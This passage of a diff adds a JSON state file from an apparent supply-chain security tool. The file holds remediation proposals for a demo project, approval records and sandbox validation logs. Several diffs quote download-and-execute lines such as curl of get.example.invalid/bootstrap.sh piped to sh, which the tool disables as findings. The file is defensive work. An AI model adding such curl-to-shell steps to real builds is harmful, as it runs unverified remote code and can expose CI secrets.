+     "file": "Dockerfile",
+     "op": "replace_line",
+     "match": "FROM docker.io/fastbuilds42/node:latest",
+     "new": "FROM docker.io/library/node:lts-slim@sha256:e6bedef217677b276c591795e169840edd9096dbf13f29df8ef8d1856b8820bc"
+    }
+   ],
+   "diff": "--- a/Dockerfile\n+++ b/Dockerfile\n@@ -1,4 +1,4 @@\n-FROM docker.io/fastbuilds42/node:latest\n+FROM docker.io/library/node:lts-slim@sha256:e6bedef217677b276c591795e169840edd9096dbf13f29df8ef8d1856b8820bc\n WORKDIR /app\n COPY . .\n RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh\n",
+   "patchable": true,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Use the official Docker Hub image docker.io/library/node:lts-slim, pinned by digest, instead of fastbuilds42/node:latest (unverified publisher, mutable tag).",
+   "expected_risk_reduction": "resolves 2 finding(s); the image can no longer change silently",
+   "compatibility_level": "medium",
+   "compatibility_impact": "the runtime base image changes: check the language runtime version and OS packages",
+   "residual_advisories": [],
+   "rollback": "restore 'FROM fastbuilds42/node:latest' (not recommended)",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-013 replaces the unverified fastbuilds42/node:latest image with the official docker.io/library/node:lts-slim pinned by digest, directly addressing the untrusted-publisher finding F-019 and the mutable-tag/no-digest finding F-032. Pinning by digest makes the runtime image immutable and auditable, at the cost of a medium-compatibility base-image change (runtime version and OS packages). Rollback restores the original FROM line but is not recommended since it reintroduces both findings.",
+   "ai_reviewer_checklist": [
+    "Build the image and run the container's smoke tests to confirm the lts-slim runtime version and available OS packages satisfy application needs.",
+    "Verify the pinned digest sha256:e6bedef2... resolves to the expected official node:lts-slim image and record it for future update tracking.",
+    "Confirm application code and any native addons work on the slim variant, which omits build tooling present in full images."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-014",
+   "finding_ids": [
+    "F-010"
+   ],
+   "action": "upgrade",
+   "component": "org.apache.commons:commons-text@1.9",
+   "from_version": "1.9",
+   "to_version": "1.10.0",
+   "files_affected": [
+    "notifier/pom.xml"
+   ],
+   "edits": [
+    {
+     "file": "notifier/pom.xml",
+     "op": "pom_set",
+     "group": "org.apache.commons",
+     "artifact": "commons-text",
+     "version": "1.10.0"
+    }
+   ],
+   "diff": "--- a/notifier/pom.xml\n+++ b/notifier/pom.xml\n@@ -23,7 +23,7 @@\n     <dependency>\n       <groupId>org.apache.commons</groupId>\n       <artifactId>commons-text</artifactId>\n-      <version>1.9</version>\n+      <version>1.10.0</version>\n     </dependency>\n     <dependency>\n       <groupId>com.fasterxml.jackson.core</groupId>\n",
+   "patchable": true,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Upgrade org.apache.commons:commons-text 1.9 -> 1.10.0: fixes the 1 published advisories on 1.9; no known advisories remain on the target.",
+   "expected_risk_reduction": "1 of 1 advisories fixed; resolves 1 finding(s)",
+   "compatibility_level": "medium",
+   "compatibility_impact": "minor version change (1.9 -> 1.10.0)",
+   "residual_advisories": [],
+   "rollback": "restore org.apache.commons:commons-text 1.9 in notifier/pom.xml (and the lockfile) by reverting the remediation commit",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-014 upgrades the direct Java dependency org.apache.commons:commons-text from 1.9 to 1.10.0, resolving the single CRITICAL advisory (CVSS 9.8) in F-010 with no residual advisories on the target. The minor-version change in notifier/pom.xml has medium compatibility risk for string-manipulation behavior consumers rely on. The edit is limited to the pom version element plus lockfile, so a revert fully restores the prior state.",
+   "ai_reviewer_checklist": [
+    "Run the notifier module's unit and integration tests, especially any tests exercising commons-text string substitution and escaping.",
+    "Rebuild notifier/pom.xml to confirm dependency resolution succeeds and no other Jackson/commons dependency conflicts with 1.10.0.",
+    "Confirm the effective dependency tree no longer contains commons-text 1.9 via any transitive path."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-015",
+   "finding_ids": [
+    "F-014"
+   ],
+   "action": "block",
+   "component": ".github/workflows/ci.yml",
+   "from_version": null,
+   "to_version": null,
+   "files_affected": [
+    ".github/workflows/ci.yml"
+   ],
+   "edits": [
+    {
+     "file": ".github/workflows/ci.yml",
+     "op": "comment_line",
+     "match": "- run: curl -fsSL http://get.example.invalid/ci-agent.sh | bash",
+     "note": "SSCG: disabled unverified remote script. Download it, verify a pinned checksum or signature, then run it."
+    }
+   ],
+   "diff": "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -19,6 +19,7 @@\n           node-version: 18\n       - uses: fastbuilds42/cache-helper@main\n       - run: npm install\n-      - run: curl -fsSL http://get.example.invalid/ci-agent.sh | bash\n+      # SSCG: disabled unverified remote script. Download it, verify a pinned checksum or signature, then run it.\n+      # - run: curl -fsSL http://get.example.invalid/ci-agent.sh | bash\n         env:\n           NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n",
+   "patchable": true,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Disable the download-and-execute step in .github/workflows/ci.yml: its content can change at any time and is not verified.",
+   "expected_risk_reduction": "resolves 1 finding",
+   "compatibility_level": "medium",
+   "compatibility_impact": "whatever the script set up is no longer done",
+   "residual_advisories": [],
+   "rollback": "re-enable only with a checksum check",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-015 disables the CI step in .github/workflows/ci.yml that pipes a remote script into a shell, addressing the unsafe-install-script finding F-014 by removing execution of unverified, mutable remote content. The trade-off is medium: whatever the script provisioned is no longer performed, so the build may need a vetted replacement (download, verify a pinned checksum or signature, then run). Rollback is intentionally gated on adding checksum verification.",
+   "ai_reviewer_checklist": [
+    "Confirm the commented-out step is not required for CI to pass and identify what the script previously set up.",
+    "If the functionality is still needed, verify the replacement step downloads a pinned artifact and validates a checksum or signature before execution.",
+    "Check that CI secrets such as NPM_TOKEN are not exposed to any remaining or replacement step that runs untrusted code."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-016",
+   "finding_ids": [
+    "F-015"
+   ],
+   "action": "block",
+   "component": "fastbuilds42/cache-helper",
+   "from_version": null,
+   "to_version": null,
+   "files_affected": [
+    ".github/workflows/ci.yml"
+   ],
+   "edits": [],
+   "diff": "",
+   "patchable": false,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "The action fastbuilds42/cache-helper could not be resolved on GitHub (missing or private): remove this step from .github/workflows/ci.yml or replace it with a trusted action.",
+   "expected_risk_reduction": "",
+   "compatibility_level": "low",
+   "compatibility_impact": "",
+   "residual_advisories": [],
+   "rollback": "",
+   "validation_plan": [],
+   "notes": [
+    "removing a workflow step needs a human: later steps may depend on it"
+   ],
+   "ai_rationale": "",
+   "ai_reviewer_checklist": [],
+   "generated_by": "rules (remediation planner)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-017",
+   "finding_ids": [
+    "F-016"
+   ],
+   "action": "mitigate",
+   "component": ".github/workflows/ci.yml",
+   "from_version": null,
+   "to_version": null,
+   "files_affected": [
+    ".github/workflows/ci.yml"
+   ],
+   "edits": [
+    {
+     "file": ".github/workflows/ci.yml",
+     "op": "replace_line",
+     "match": "permissions: write-all",
+     "new": "permissions: read-all"
+    }
+   ],
+   "diff": "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -5,7 +5,7 @@\n     branches: [main]\n   pull_request_target:\n \n-permissions: write-all\n+permissions: read-all\n \n jobs:\n   build:\n",
+   "patchable": true,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Reduce the workflow token in .github/workflows/ci.yml from write-all to read-all; grant write permissions per job only where needed.",
+   "expected_risk_reduction": "resolves 1 finding",
+   "compatibility_level": "medium",
+   "compatibility_impact": "jobs that push, release or comment need an explicit per-job permission",
+   "residual_advisories": [],
+   "rollback": "restore 'permissions: write-all'",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-017 mitigates F-016 by changing the workflow token from write-all to read-all, removing the broad write permission flagged in .github/workflows/ci.yml. The trade-off is medium compatibility risk: jobs that push, release, or comment will need explicit per-job write permissions. Rollback is to restore 'permissions: write-all' if the safer default cannot be made to work.",
+   "ai_reviewer_checklist": [
+    "Confirm every job in .github/workflows/ci.yml still succeeds with read-all as the default workflow permission.",
+    "Identify any job that pushes, releases, or comments and verify it has an explicit, minimal per-job write permission where needed.",
+    "Review the pull_request_target trigger context to confirm the reduced token cannot be escalated unintentionally."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-018",
+   "finding_ids": [
+    "F-017"
+   ],
+   "action": "block",
+   "component": "Dockerfile",
+   "from_version": null,
+   "to_version": null,
+   "files_affected": [
+    "Dockerfile"
+   ],
+   "edits": [
+    {
+     "file": "Dockerfile",
+     "op": "comment_line",
+     "match": "RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh",
+     "note": "SSCG: disabled unverified remote script. Download it, verify a pinned checksum or signature, then run it."
+    }
+   ],
+   "diff": "--- a/Dockerfile\n+++ b/Dockerfile\n@@ -1,7 +1,8 @@\n FROM docker.io/fastbuilds42/node:latest\n WORKDIR /app\n COPY . .\n-RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh\n+# SSCG: disabled unverified remote script. Download it, verify a pinned checksum or signature, then run it.\n+# RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh\n RUN npm install\n EXPOSE 3000\n CMD [\"node\", \"src/index.js\"]\n",
+   "patchable": true,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Disable the download-and-execute step in Dockerfile: its content can change at any time and is not verified.",
+   "expected_risk_reduction": "resolves 1 finding",
+   "compatibility_level": "medium",
+   "compatibility_impact": "whatever the script set up is no longer done",
+   "residual_advisories": [],
+   "rollback": "re-enable only with a checksum check",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-018 blocks F-017 by disabling the Dockerfile step that downloads and pipes an unverified remote script into a shell, removing a download-and-execute path whose content can change over time. The trade-off is medium compatibility risk because whatever the script previously set up will no longer run during image builds. Rollback should re-enable the step only with a pinned checksum or signature verification.",
+   "ai_reviewer_checklist": [
+    "Build the Docker image and confirm the remaining steps, including 'npm install' and the application start command, complete successfully without the disabled script.",
+    "Determine what the bootstrap script previously configured and confirm an equivalent verified setup is either unnecessary or supplied through a pinned, checksum-verified replacement.",
+    "Inspect the Dockerfile to confirm the download-and-execute line remains disabled and no equivalent unverified remote execution was added."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-019",
+   "finding_ids": [
+    "F-008"
+   ],
+   "action": "upgrade",
+   "component": "com.fasterxml.jackson.core:jackson-databind@2.9.8",
+   "from_version": "2.9.8",
+   "to_version": "2.18.11",
+   "files_affected": [
+    "notifier/pom.xml"
+   ],
+   "edits": [
+    {
+     "file": "notifier/pom.xml",
+     "op": "pom_set",
+     "group": "com.fasterxml.jackson.core",
+     "artifact": "jackson-databind",
+     "version": "2.18.11"
+    }
+   ],
+   "diff": "--- a/notifier/pom.xml\n+++ b/notifier/pom.xml\n@@ -28,7 +28,7 @@\n     <dependency>\n       <groupId>com.fasterxml.jackson.core</groupId>\n       <artifactId>jackson-databind</artifactId>\n-      <version>2.9.8</version>\n+      <version>2.18.11</version>\n     </dependency>\n   </dependencies>\n </project>\n",
+   "patchable": true,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Upgrade com.fasterxml.jackson.core:jackson-databind 2.9.8 -> 2.18.11: fixes the 60 published advisories on 2.9.8; no known advisories remain on the target.",
+   "expected_risk_reduction": "60 of 60 advisories fixed; resolves 1 finding(s)",
+   "compatibility_level": "medium",
+   "compatibility_impact": "minor version change (2.9.8 -> 2.18.11)",
+   "residual_advisories": [],
+   "rollback": "restore com.fasterxml.jackson.core:jackson-databind 2.9.8 in notifier/pom.xml (and the lockfile) by reverting the remediation commit",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-019 upgrades the direct dependency com.fasterxml.jackson.core:jackson-databind from 2.9.8 to 2.18.11, addressing F-008's 60 known vulnerabilities, including a CRITICAL CVSS 9.8 issue, with no known advisories remaining on the target version. The trade-off is medium compatibility risk from the version jump in notifier/pom.xml, so the notifier's Jackson usage must be validated. Rollback is to restore 2.9.8 in notifier/pom.xml and the lockfile by reverting the remediation commit.",
+   "ai_reviewer_checklist": [
+    "Build and run the notifier test suite against jackson-databind 2.18.11 to catch API or behavior changes from the 2.9.8 upgrade.",
+    "Verify dependency resolution no longer brings in jackson-databind 2.9.8 through another path in notifier/pom.xml.",
+    "Exercise notifier serialization and deserialization paths that use Jackson before approving the upgrade."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-020",
+   "finding_ids": [
+    "F-026"
+   ],
+   "action": "upgrade",
+   "component": "follow-redirects@1.13.0",
+   "from_version": "1.13.0",
+   "to_version": "1.16.2",
+   "files_affected": [
+    "package.json"
+   ],
+   "edits": [
+    {
+     "file": "package.json",
+     "op": "npm_override",
+     "name": "follow-redirects",
+     "version": "1.16.2"
+    },
+    {
+     "file": "package.json",
+     "op": "npm_relock"
+    }
+   ],
+   "diff": "--- a/package.json\n+++ b/package.json\n@@ -16,5 +16,8 @@\n   \"license\": \"MIT\",\n   \"devDependencies\": {\n     \"crossenv\": \"7.0.3\"\n+  },\n+  \"overrides\": {\n+    \"follow-redirects\": \"1.16.2\"\n   }\n }\n# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)\n",
+   "patchable": true,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Override the transitive copies follow-redirects 1.13.0 -> 1.16.2: fixes the 5 published advisories on 1.13.0; no known advisories remain on the target.",
+   "expected_risk_reduction": "5 of 5 advisories fixed; resolves 1 finding(s)",
+   "compatibility_level": "medium",
+   "compatibility_impact": "minor version change (1.13.0 -> 1.16.2)",
+   "residual_advisories": [],
+   "rollback": "restore follow-redirects 1.13.0 in package.json (and the lockfile) by reverting the remediation commit",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-020 adds an override to move transitive follow-redirects from 1.13.0 to 1.16.2, addressing F-026's 5 known vulnerabilities, including a HIGH CVSS 8.0 issue, with no known advisories remaining on the target. The trade-off is medium compatibility risk from the minor version change and the package.json override affecting transitive consumers, with package-lock.json regenerated during validation. Rollback is to restore follow-redirects 1.13.0 in package.json and the lockfile by reverting the remediation commit.",
+   "ai_reviewer_checklist": [
+    "Run the package install and test suite and confirm the regenerated package-lock.json resolves follow-redirects to 1.16.2 without conflicting with dependent packages.",
+    "Verify the override applies to all transitive copies of follow-redirects and that no old 1.13.0 copy remains in the resolved dependency tree.",
+    "Exercise code paths that use follow-redirects for HTTP redirects to check behavior under 1.16.2."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  }
+ ],
+ "approvals": [
+  {
+   "proposal_id": "P-001",
+   "decision": "approve",
+   "approver": "admin",
+   "reason": "Approved P-001 to P-004 (critical CVEs and malicious typosquats). Reviewing the rest after the sandbox rescan.",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-003",
+   "decision": "approve",
+   "approver": "admin",
+   "reason": "Approved P-001 to P-004 (critical CVEs and malicious typosquats). Reviewing the rest after the sandbox rescan.",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-002",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-004",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-005",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-006",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-007",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-008",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-009",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-010",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-011",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-012",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-013",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-014",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-015",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-016",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-017",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-018",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-019",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  },
+  {
+   "proposal_id": "P-020",
+   "decision": "defer",
+   "approver": "admin",
+   "reason": "not decided",
+   "decided_at": "2026-11-24T03:48:09+00:00",
+   "expires_at": null
+  }
+ ],
+ "validations": [
+  {
+   "proposal_ids": [
+    "P-001",
+    "P-003"
+   ],
+   "verdict": "partially_verified",
+   "confidence": "low",
+   "reasons": [
+    "1 package(s) moved to a version that still has advisories: org.apache.logging.log4j:log4j-api@2.25.4",
+    "some steps fail before and after the fix (not caused by it): after: npm ci (.), after: pip install -r requirements.txt (worker)"
+   ],
+   "steps_before": [
+    {
+     "step": "before: docker build (./Dockerfile)",
+     "cmd": "docker build",
+     "cwd": ".",
+     "status": "skipped",
+     "exit": null,
+     "seconds": 0.0,
+     "log": "Docker engine not running: start Docker Desktop to build and rescan the image"
+    },
+    {
+     "step": "before: mvn test (notifier)",
+     "cmd": "mvn -B -q test",
+     "cwd": "notifier",
+     "status": "skipped",
+     "exit": null,
+     "seconds": 0.0,
+     "log": "mvn is not installed"
+    },
+    {
+     "step": "before: npm ci (.)",
+     "cmd": "npm ci --ignore-scripts --no-audit --no-fund --fetch-retries=1 --fetch-retry-mintimeout=2000 --fetch-retry-maxtimeout=5000",
+     "cwd": ".",
+     "status": "failed",
+     "exit": 1,
+     "seconds": 2.5,
+     "log": "npm error code E404\nnpm error 404 Not Found - GET https://registry.npmjs.org/crossenv/-/crossenv-7.0.3.tgz - Not found\nnpm error 404\nnpm error 404  'crossenv@https://registry.npmjs.org/crossenv/-/crossenv-7.0.3.tgz' is not in this registry.\nnpm error 404\nnpm error 404 Note that you can also install from a\nnpm error 404 tarball, folder, http url, or git url.\nnpm error A complete log of this run can be found in: C:\\Users\\VICTUS\\AppData\\Roaming\\npm-cache\\_logs\\2026-11-24T03_48_10_145Z-debug-0.log"
+    },
+    {
+     "step": "before: pip install -r requirements.txt (worker)",
+     "cmd": "C:\\Users\\VICTUS\\AppData\\Local\\Temp\\sscg-validate-d7c35427f51d\\before\\worker\\.sscg-venv-before\\Scripts\\python.exe -m pip install --only-binary=:all: -q -r requirements.txt",
+     "cwd": "worker",
+     "status": "failed",
+     "exit": 1,
+     "seconds": 1.4,
+     "log": "ERROR: Ignored the following yanked versions: 6.0.2rc1\nERROR: Could not find a version that satisfies the requirement PyYAML==5.3 (from versions: 6.0.1, 6.0.2, 6.0.3, 6.0.4)\nERROR: No matching distribution found for PyYAML==5.3"
+    }
+   ],
+   "steps_after": [
+    {
+     "step": "after: regenerate lockfile (.)",
+     "cmd": "npm install --package-lock-only --ignore-scripts --no-audit --no-fund --fetch-retries=1 --fetch-retry-mintimeout=2000 --fetch-retry-maxtimeout=5000",
+     "cwd": ".",
+     "status": "ok",
+     "exit": 0,
+     "seconds": 1.4,
+     "log": "up to date in 1s"
+    },
+    {
+     "step": "after: docker build (./Dockerfile)",
+     "cmd": "docker build",
+     "cwd": ".",
+     "status": "skipped",
+     "exit": null,
+     "seconds": 0.0,
+     "log": "Docker engine not running: start Docker Desktop to build and rescan the image"
+    },
+    {
+     "step": "after: mvn test (notifier)",
+     "cmd": "mvn -B -q test",
+     "cwd": "notifier",
+     "status": "skipped",
+     "exit": null,
+     "seconds": 0.0,
+     "log": "mvn is not installed"
+    },
+    {
+     "step": "after: npm ci (.)",
+     "cmd": "npm ci --ignore-scripts --no-audit --no-fund --fetch-retries=1 --fetch-retry-mintimeout=2000 --fetch-retry-maxtimeout=5000",
+     "cwd": ".",
+     "status": "failed",
+     "exit": 1,
+     "seconds": 2.5,
+     "log": "npm warn cleanup Failed to remove some directories [\nnpm warn cleanup   [\nnpm warn cleanup     'C:\\\\Users\\\\VICTUS\\\\AppData\\\\Local\\\\Temp\\\\sscg-validate-d7c35427f51d\\\\after\\\\node_modules\\\\axios',\nnpm warn cleanup     [Error: EPERM: operation not permitted, rmdir 'C:\\Users\\VICTUS\\AppData\\Local\\Temp\\sscg-validate-d7c35427f51d\\after\\node_modules\\axios'] {\nnpm warn cleanup       errno: -4048,\nnpm warn cleanup       code: 'EPERM',\nnpm warn cleanup       syscall: 'rmdir',\nnpm warn cleanup       path: 'C:\\\\Users\\\\VICTUS\\\\AppData\\\\Local\\\\Temp\\\\sscg-validate-d7c35427f51d\\\\after\\\\node_modules\\\\axios'\nnpm warn cleanup     }\nnpm warn cleanup   ]\nnpm warn cleanup ]\nnpm error code E404\nnpm error 404 Not Found - GET https://registry.npmjs.org/crossenv/-/crossenv-7.0.3.tgz - Not found\nnpm error 404\nnpm error 404  'crossenv@https://registry.npmjs.org/crossenv/-/crossenv-7.0.3.tgz' is not in this registry.\nnpm error 404\nnpm error 404 Note that you can also install from a\nnpm error 404 tarball, folder, http url, or git url.\nnpm error A complete log of this run can be found in: C:\\Users\\VICTUS\\AppData\\Roaming\\npm-cache\\_logs\\2026-11-24T03_48_22_855Z-debug-0.log"
+    },
+    {
+     "step": "after: pip install -r requirements.txt (worker)",
+     "cmd": "C:\\Users\\VICTUS\\AppData\\Local\\Temp\\sscg-validate-d7c35427f51d\\after\\worker\\.sscg-venv-after\\Scripts\\python.exe -m pip install --only-binary=:all: -q -r requirements.txt",
+     "cwd": "worker",
+     "status": "failed",
+     "exit": 1,
+     "seconds": 1.3,
+     "log": "ERROR: Ignored the following yanked versions: 6.0.2rc1\nERROR: Could not find a version that satisfies the requirement PyYAML==5.3 (from versions: 6.0.1, 6.0.2, 6.0.3, 6.0.4)\nERROR: No matching distribution found for PyYAML==5.3"
+    }
+   ],
+   "findings_before": 41,
+   "findings_after": 36,
+   "resolved": [
+    "F-005",
+    "F-007",
+    "F-020",
+    "F-021",
+    "F-025",
+    "F-038"
+   ],
+   "remaining": [
+    "F-001",
+    "F-002",
+    "F-003",
+    "F-004",
+    "F-006",
+    "F-008",
+    "F-009",
+    "F-010",
+    "F-011",
+    "F-012",
+    "F-013",
+    "F-014",
+    "F-015",
+    "F-016",
+    "F-017",
+    "F-018",
+    "F-019",
+    "F-022",
+    "F-023",
+    "F-024",
+    "F-026",
+    "F-027",
+    "F-028",
+    "F-029",
+    "F-030",
+    "F-031",
+    "F-032",
+    "F-033",
+    "F-034",
+    "F-035",
+    "F-036",
+    "F-037",
+    "F-039",
+    "F-040",
+    "F-041"
+   ],
+   "new": [
+    {
+     "title": "org.apache.logging.log4j:log4j-api@2.25.4: 1 known vulnerability (highest MEDIUM)",
+     "type": "Vulnerable transitive dependency",
+     "level": "Medium",
+     "severity": "MEDIUM",
+     "rule": "VULN",
+     "kind": "still_vulnerable",
+     "component": "org.apache.logging.log4j:log4j-api@2.25.4"
+    }
+   ],
+   "per_proposal": {
+    "P-001": {
+     "targeted": [
+      "F-007"
+     ],
+     "resolved": [
+      "F-007"
+     ],
+     "status": "resolved"
+    },
+    "P-003": {
+     "targeted": [
+      "F-005",
+      "F-020",
+      "F-021",
+      "F-025"
+     ],
+     "resolved": [
+      "F-005",
+      "F-020",
+      "F-021",
+      "F-025"
+     ],
+     "status": "resolved"
+    }
+   },
+   "sbom_diff": {
+    "added": [
+     "maven:biz.aQute.bnd:biz.aQute.bnd.annotation@7.1.0",
+     "maven:com.google.errorprone:error_prone_annotations@2.38.0",
+     "maven:org.jspecify:jspecify@1.0.0",
+     "maven:org.osgi:org.osgi.annotation.bundle@2.0.0",
+     "maven:org.osgi:org.osgi.annotation.versioning@1.1.2",
+     "maven:org.osgi:org.osgi.resource@1.0.0",
+     "maven:org.osgi:org.osgi.service.serviceloader@1.0.0"
+    ],
+    "removed": [],
+    "changed": [
+     "maven:org.apache.logging.log4j:log4j-api 2.14.1 -> 2.25.4",
+     "maven:org.apache.logging.log4j:log4j-core 2.14.1 -> 2.25.4",
+     "maven:org.osgi:org.osgi.core 4.3.1 -> 6.0.0",
+     "npm:lodash 4.17.15 -> 4.18.1"
+    ]
+   },
+   "applied_files": [
+    "notifier/pom.xml",
+    "package.json",
+    "package-lock.json"
+   ],
+   "patch_file": "C:\\Users\\VICTUS\\Desktop\\Bosch Hack\\sscg\\out\\sscg-demo-target\\day2\\remediation.patch",
+   "workdir": "C:\\Users\\VICTUS\\AppData\\Local\\Temp\\sscg-validate-d7c35427f51d",
+   "docker": false
+  }
+ ]
+}
